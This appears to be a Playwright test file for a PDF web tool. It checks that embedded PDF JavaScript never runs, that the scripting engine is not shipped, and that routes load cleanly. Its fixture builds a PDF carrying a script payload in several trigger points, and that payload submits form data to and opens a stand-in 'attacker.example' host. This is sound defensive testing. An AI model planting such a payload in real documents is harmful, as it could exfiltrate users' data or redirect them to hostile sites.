import { test, expect } from './fixtures'
import { readdirSync } from 'node:fs'
import { join } from 'node:path'
import { PDFDocument, PDFName, PDFString, StandardFonts } from 'pdf-lib'

/**
 * Embedded PDF JavaScript must never run. FreePDF uses PDF.js's display layer only (no viewer, no
 * scripting sandbox: the QuickJS bundle is not even shipped), and pdf-lib never interprets actions.
 * The fixture carries every common script trigger: document OpenAction, the document-level
 * /Names/JavaScript tree, a page open action (/AA /O) and a link annotation with a JavaScript action.
 * Each script would raise a dialog, navigate and call out to an external host if it ran.
 */
async function scriptedPdf(): Promise<Buffer> {
  const doc = await PDFDocument.create()
  const font = await doc.embedFont(StandardFonts.Helvetica)
  for (let i = 0; i < 2; i++) doc.addPage([400, 300]).drawText(`Scripted page ${i + 1}`, { x: 40, y: 150, size: 20, font })
  const ctx = doc.context
  const js = (code: string) => ctx.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of(code) })
  const payload = "app.alert('pdf-js-ran'); this.submitForm('https://attacker.example/steal'); app.launchURL('https://attacker.example/open', true);"
  doc.catalog.set(PDFName.of('OpenAction'), ctx.register(js(payload)))
  doc.catalog.set(PDFName.of('Names'), ctx.obj({ JavaScript: ctx.obj({ Names: [PDFString.of('init'), ctx.register(js(payload))] }) }))
  const page = doc.getPage(0)
  page.node.set(PDFName.of('AA'), ctx.obj({ O: ctx.register(js(payload)) }))
  const link = ctx.register(ctx.obj({ Type: 'Annot', Subtype: 'Link', Rect: [0, 0, 400, 300], Border: [0, 0, 0], A: js(payload) }))
  page.node.set(PDFName.of('Annots'), ctx.obj([link]))
  return Buffer.from(await doc.save())
}

for (const route of ['/organize-pdf', '/rotate-pdf', '/pdf-to-png']) {
  test(`embedded PDF JavaScript never executes (${route})`, async ({ page }) => {
    const dialogs: string[] = []
    const scriptAssets: string[] = []
    page.on('dialog', (d) => { dialogs.push(d.message()); d.dismiss().catch(() => {}) })
    page.context().on('request', (r) => { if (/quickjs|sandbox/i.test(r.url())) scriptAssets.push(r.url()) })
    const startUrl = route

    await page.goto(route)
    await page.getByTestId('file-input').first().setInputFiles({ name: 'scripted.pdf', mimeType: 'application/pdf', buffer: await scriptedPdf() })
    if (route === '/organize-pdf') {
      // Page thumbnails are rendered by PDF.js: the point at which a viewer would run document scripts.
      const thumb = page.locator('canvas, img[src^="blob:"]').first()
      await expect(thumb).toBeVisible({ timeout: 30_000 })
      // Clicking where the JavaScript link annotation sits must not trigger it either.
      await thumb.click({ force: true }).catch(() => {})
    } else {
      // Full processing: pdf-lib rewrites the file (rotate) or PDF.js renders every page (pdf-to-png).
      await page.getByTestId('run').click()
      await expect(page.getByTestId('download').or(page.getByTestId('download-zip'))).toBeVisible({ timeout: 60_000 })
    }
    await page.waitForTimeout(500)

    expect(dialogs, 'a PDF script opened a dialog').toEqual([])
    expect(scriptAssets, 'the PDF scripting engine was requested').toEqual([])
    expect(new URL(page.url()).pathname).toBe(startUrl)
    // External requests (submitForm / launchURL) are failed by the global privacy guard.
  })
}

test('the PDF scripting engine is not deployed', async ({ request }) => {
  const dir = join(process.cwd(), 'dist', 'pdfjs')
  const files = readdirSync(dir, { recursive: true }).map(String)
  expect(files.filter((f) => /quickjs|sandbox/i.test(f))).toEqual([])
  const version = readdirSync(dir)[0]
  // Production (Cloudflare) answers 404; `vite preview` answers its HTML fallback. Either way no script.
  const res = await request.get(`/pdfjs/${version}/wasm/quickjs-eval.js`)
  expect(res.ok() && /javascript/.test(res.headers()['content-type'] ?? '')).toBe(false)
})

/** Every shipped route loads with no console errors and no failed same-origin asset. */
const routes = readdirSync(join(process.cwd(), 'dist'))
  .filter((f) => f.endsWith('.html') && f !== '404.html')
  .map((f) => (f === 'index.html' ? '/' : `/${f.replace(/\.html$/, '')}`))

for (const lang of ['en', 'ar'] as const) {
  test(`route crawl (${lang}): every page loads cleanly`, async ({ page }) => {
    test.setTimeout(120_000)
    expect(routes.length).toBeGreaterThanOrEqual(13)
    await page.addInitScript((l) => localStorage.setItem('freepdf:lang', l), lang)
    const problems: string[] = []
    page.on('console', (m) => { if (m.type() === 'error') problems.push(`${page.url()} console error: ${m.text()}`) })
    page.on('response', (r) => { if (r.status() >= 400) problems.push(`${r.status()} ${r.url()}`) })
    for (const route of routes) {
      const res = await page.goto(route)
      expect(res?.status(), route).toBe(200)
      await expect(page.locator('h1').first()).toBeVisible()
      await expect(page.locator('html')).toHaveAttribute('dir', lang === 'ar' ? 'rtl' : 'ltr')
    }
    expect(problems).toEqual([])
  })
}

test('unknown routes return a real 404 that is not indexed', async ({ page }) => {
  // `vite preview` has an HTML fallback (200) for unknown paths; production 404 semantics are only
  // meaningful on Cloudflare's runtime, which `npm run test:cloudflare` targets via PW_BASE_URL.
  test.skip(!process.env.PW_BASE_URL, 'production 404 semantics are checked against the Cloudflare runtime')
  const res = await page.goto('/no-such-tool')
  expect(res?.status()).toBe(404)
  await expect(page.locator('meta[name="robots"]')).toHaveAttribute('content', /noindex/)
  await expect(page.getByRole('link').first()).toBeVisible()
})
